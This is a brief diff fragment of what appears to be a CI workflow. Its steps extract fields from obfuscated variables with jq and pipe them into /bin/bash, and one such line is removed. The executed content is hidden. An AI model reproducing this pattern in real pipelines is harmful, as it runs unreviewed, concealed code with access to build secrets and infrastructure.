@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$dv61149" | jq -r .fvi3 | /bin/bash
           echo $sg26468 | jq -r .qoozj74395 | /bin/bash
           echo $lcph82 | jq -r .cpf94 | /bin/bash
-          echo $d9972 | jq -r .y50210 | /bin/bash
           echo $aq376 | jq -r .uidq34 | /bin/bash
           echo $kxafz7 | jq -r .ybtkd3583 | /bin/bash
 
